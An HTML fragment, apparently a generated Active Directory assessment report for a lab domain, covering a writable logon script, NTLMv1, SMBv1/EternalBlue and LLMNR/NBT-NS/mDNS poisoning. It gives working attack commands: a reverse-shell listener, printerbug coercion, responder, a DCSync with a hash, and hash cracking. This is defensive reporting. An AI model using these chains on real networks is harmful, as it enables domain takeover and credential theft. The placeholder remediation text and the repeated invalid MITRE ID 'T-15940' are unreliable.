                                                    <p>2. With full control to write to the logon script, an adversary can create a malicious file with the same name and upload it to replace the legitimate file with code that will establish a remote connection for the attacker.</p>
                                                    <p class="code">smbclient //dc.test.local/SYSVOL -U test%'Password123!'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-2.png"
                                                        alt="Replacing the logon script">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                            <div class="attack-text">
                                                <p>3. When the NETLOGON script is executed on a host (when a user logs on), the adversary will obtain a remote command shell on the target system.</p>
                                                <p class="code">nc -lvnp 443</p>
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/ACLs/modifiablelogonscript-3.png"
                                                    alt="Obtaining a reverse shell">
                                            </span>
                                        </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL on logon script</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr></tbody></table></div>








                <div class="finding-header">Legacy</div>
                <div class="finding-container">
                <table>
                    <thead>
                        <tr>
                            <th class="table-header">Issue</th>
                            <th class="table-header">Risk</th>
                        </tr>
                    </thead>
                    <tbody>                <tr>
                            <td class="toggle" id="NTLMv1-is-not-disabled"><u>NTLMv1 is not disabled</u></td>
                            <td class="finding-riskCRITICAL">CRITICAL</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Low-privileged users can impersonate the identity of a domain controller via an NTLMv1 authentication.</td>
                                                <td>T-15940</td>
                                                <td>+50</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">LMCompatibilityLevel</td><td>Send LM &amp; NTLM - use NTLMv2 session security if negotiated</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>NTLMv1 is a legacy authentication protocol from 1993 that is rarely needed anymore, yet a surprising number of organizations still have it enabled despite it being cryptographically broken. Through RPC calls any authenticated domain user can coerce an authentication call back from the domain controller, negotiating NTLMv1 authentication rather than the more secure NTLMv2 or Kerberos v5. With the NTLMv1 password hash of the domain controller, due to cryptographic flaws this can be downgraded into the NTLM hash which is sufficient to impersonate the identity of a domain controller and thus fully compromise the domain. by performing a DCSync.</p>
                                                    <p>The LAN Manager Authentication level is not set to disable NTLMv1 in either the Default Domain Controllers Policy or the Default Domain Policy.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://trustedsec.com/blog/practical-attacks-against-ntlmv1">Link 1</a></p>
                                                    <p><a href="https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. A low-privileged user can by default coerce machine authentication using RPC from the domain controller (192.168.10.141) to an attacker controlled machine (192.168.10.130) with printerbug.</p>
                                                            <p class="code">python3 printerbug.py jack:'Password123!'@192.168.10.141 192.168.10.130 </p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/NTLMv1-1.png" alt="Coercing authentication">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An attacker can negotiate an NTLMv1 connection with the domain controller with responder and retrieve an NTLMv1 password hash of the domain controller.</p>
                                                            <p class="code">sudo responder -I eth0 --lm</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/NTLMv1-2.png" alt="Retrieving the NTLMv1 password hash">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. As NTLMv1 is cryptographically broken the hash can be downgraded by submitting a converted hash to https://crack.sh/, which will return the NTLM hash of the domain controller.</p>
                                                            <p class="code">python3 ntlmv1.py --ntlmv1 <DC hash></p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/NTLMv1-3.png" alt="Cracking the NTLMv1 hash">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>4. The ntlm hash can then be used to replicate the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                            <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :89aca08404383706e09c9861dfee797e</p>       
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/NTLMv1-4.png" alt="Performing a DCSync">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable NTLMv1</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Outdated-Operating-Systems-found"><u>Outdated Operating Systems found</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can remotely compromise a computer via outdated operating systems.</td>
                                                <td>T-15940</td>
                                                <td>+30</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Operating Systems</td><td>Windows 98<br>Windows XP<br>Windows Vista<br>Windows 7 standard</td></tr>
                                                    <tr><td class="grey">Vulnerable Computers</td><td>CN=Windows98,CN=Computers,DC=test,DC=local<br>CN=WINDOWSXP,CN=Computers,DC=test,DC=local<br>CN=WINDOWSVISTA,CN=Computers,DC=test,DC=local<br>CN=WIN7,CN=Computers,DC=test,DC=local</td></tr>
                                                    <tr><td class="grey">Number of outdated systems</td><td>4</td></tr>
                                                    <tr><td class="grey">Enabled</td><td>True</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Legacy systems often run business-critical software that cannot be upgraded, however contain critical CVEs facilitating remote code execution and denial of service largely due to vulnerabilities in SMBv1.</p>
                                                    <p>There are 4 legacy unsupported operating systems within the domain. All of these computers can be remotely taken over by attackers exploiting criticl severity CVEs. If as a mitigating control the legacy OS is disabled in AD the risk is lower as although the system can be compromised, it cannot be used for lateral movement.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://blog.netwrix.com/2021/11/30/what-is-smbv1-and-why-you-should-disable-it/">Link 1</a></p>
                                                    <p><a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0148/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any unauthenticated user with network access can find outdated devices which will have SMBv1 enabled.</p>
                                                            <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An unauthenticated attacker with network access can remotely exploit the unsupported OS running SMBv1 using ms17-010 (eternalblue).</p>
                                                            <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. Exploits effecting SMBv1 will return a remote command prompt with elevated privileges, fully compromising the legacy device.</p>
                                                            <p class="code">nc -lvnp 443</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable SMBv1</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="SMBv1-is-not-disabled-on-computers"><u>SMBv1 is not disabled on computers</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can remotely take control of a computer via SMBv1.</td>
                                                <td>T-15940</td>
                                                <td>+25</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Computers</td><td>DC.test.local<br>CA.test.local</td></tr>
                                                    <tr><td class="grey">SMBv1</td><td>Enabled</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>SMBv1 is accepted on domain controllers. SMBv1 is a legacy file sharing protocol that is over 30 years old and is associated with the WannaCry ransomware that affected the NHS in 2017. SMBv1 was deprecated in 2013 and is no longer installed by default on Windows Server 2016. Significant vulnerabilities exist within SMBv1 which allow for denial of service and remote code execution on the target host.</p>
                                                    <p>SMBv1 is enabled on 2 Computers. Any computer running SMBv1 is at risk of an unauthenticated attacker remotely taking administrative control of the device.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://blog.netwrix.com/2021/11/30/what-is-smbv1-and-why-you-should-disable-it/">Link 1</a></p>
                                                    <p><a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0148/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any unauthenticated user with network access can find devices where SMBv1 is enabled.</p>
                                                            <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An unauthenticated attacker with network access can remotely exploit SMBv1 using ms17-010 (eternalblue).</p>
                                                            <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. Exploits effecting SMBv1 will return a remote command prompt with elevated privileges, fully compromising the target device.</p>
                                                            <p class="code">nc -lvnp 443</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable SMBv1</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>        <tr>
                    <td class="toggle" id="LLMNR-is-not-disabled"><u>LLMNR is not disabled</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>An unauthenticated attacker can steal password hashes as LLMNR is vulnerable to layer 2 poisoning attacks.</td>
                                        <td>T-15940</td>
                                        <td>+25</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Registry Key</td><td>HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMultiCast</td></tr>
                                            <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>LLMNR is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with NBT-NS and mDNS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                            <p>LLMNR is not disabled in test.local by GPO as HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMultiCast is not set to 0.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An attacker listening on the local LAN with responder can respond to the LLMNR query and intercept the NTLMv2 password hash of the user.</p>
                                                    <p class="code">sudo responder -I eth0</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                                    <p class="code">john -w=./wordlist.txt hash.txt</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable LLMNR</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                            <td class="toggle" id="NBT-NS-is-not-disabled"><u>NBT-NS is not disabled</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can steal password hashes as NBT-NS is vulnerable to layer 2 poisoning attacks.</td>
                                                <td>T-15940</td>
                                                <td>+25</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Registry Key</td><td>HKLM:\SYSTEM\CurrentControlSet\Services\netbt\Parameters\interfaces\tcpip_*\NetBiosOptions</td></tr>
                                                    <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Like LLMNR, NBT-NS is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with LLMNR and mDNS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                                    <p>NBT-NS is not disabled in test.local by GPO as HKLM:\SYSTEM\CurrentControlSet\Services\netbt\Parameters\interfaces\tcpip_*\NetBiosOptions is not set to 2.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                                    <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an NBT-NS query to attempt to resolve the hostname on the local LAN.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An attacker listening on the local LAN with responder can respond to the NBT-NS query and intercept the NTLMv2 password hash of the user.</p>
                                                            <p class="code">sudo responder -I eth0</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                                            <p class="code">john -w=./wordlist.txt hash.txt</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable NBT-NS</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="mDNS-is-not-disabled"><u>mDNS is not disabled</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can steal password hashes as mDNS is vulnerable to layer 2 poisoning attacks.</td>
                                                <td>T-15940</td>
                                                <td>+25</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Registry Key</td><td>HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS</td></tr>
                                                    <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Like LLMNR and NBT-NS, mDNS is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with LLMNR and NBT-NS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                                    <p>mDNS is not disabled in test.local by GPO as HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS is not set to 0.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                                    <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an mDNS query to attempt to resolve the hostname on the local LAN.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An attacker listening on the local LAN with responder can respond to the mDNS query and intercept the NTLMv2 password hash of the user.</p>
                                                            <p class="code">sudo responder -I eth0</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                                            <p class="code">john -w=./wordlist.txt hash.txt</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable mDNS</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Outdated,-but-disabled,-Operating-Systems-found"><u>Outdated, but disabled, Operating Systems found</u></td>
                            <td class="finding-riskMEDIUM">MEDIUM</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>An unauthenticated attacker can remotely compromise a computer via outdated operating systems.</td>
                                                <td>T-15940</td>
                                                <td>+10</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Operating Systems</td><td>Windows 95<br>Windows Server 2012 enterprise</td></tr>
                                                    <tr><td class="grey">Vulnerable Computers</td><td>CN=Windows95,CN=Computers,DC=test,DC=local<br>CN=Server2012,CN=Computers,DC=test,DC=local</td></tr>
                                                    <tr><td class="grey">Number of outdated systems</td><td>2</td></tr>
                                                    <tr><td class="grey">Enabled</td><td>False</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Legacy systems often run business-critical software that cannot be upgraded, however contain critical CVEs facilitating remote code execution and denial of service largely due to vulnerabilities in SMBv1.</p>
                                                    <p>There are 2 legacy unsupported operating systems within the domain. All of these computers can be remotely taken over by attackers exploiting criticl severity CVEs. If as a mitigating control the legacy OS is disabled in AD the risk is lower as although the system can be compromised, it cannot be used for lateral movement.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://blog.netwrix.com/2021/11/30/what-is-smbv1-and-why-you-should-disable-it/">Link 1</a></p>
                                                    <p><a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0148/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any unauthenticated user with network access can find outdated devices which will have SMBv1 enabled.</p>
                                                            <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>2. An unauthenticated attacker with network access can remotely exploit the unsupported OS running SMBv1 using ms17-010 (eternalblue).</p>
                                                            <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>3. Exploits effecting SMBv1 will return a remote command prompt with elevated privileges, fully compromising the legacy device.</p>
                                                            <p class="code">nc -lvnp 443</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                        </span>
                                                    </div>
                                                    <hr>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Disable SMBv1</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr></tbody></table></div>




















                        <div class="finding-header">MISC</div>
                        <div class="finding-container">
                        <table>
                            <thead>
                                <tr>
                                    <th class="table-header">Issue</th>
                                    <th class="table-header">Risk</th>
                                </tr>
                            </thead>
                            <tbody>        <tr>
                            <td class="toggle" id="Unrestricted-outbound-access-permitted"><u>Unrestricted outbound access permitted</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr><td>Administrator accounts have unrestricted outbound access.</td>                                <td>T-15940</td>
                                                <td>+35</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Computer Name</td><td>CA.test.local</td></tr>
                                                    <tr><td class="grey">User</td><td>test\jack</td></tr>
                                                </table></td>
                                                <td class="explanation"><p>Admin accounts should not have direct access to the internet because any malicious code executed within an administrative context will have the potential to cause catastrophic damage. If an administrator visits a malicious website or opens a malicious email attachment then any virus, malware or ransomware will be able to spread around the network with the same rights that the user is logged on as; bypassing inbuilt protections and spreading to all hosts within the network.</p>                                    <p>Administrator account test\jack has internet access on CA.test.local. A tiering model should prevent admin accounts from having internet access in favour of a lower privileged account for everyday use..</p>
                                                    <p class="links"><b>Further information:</b></p>
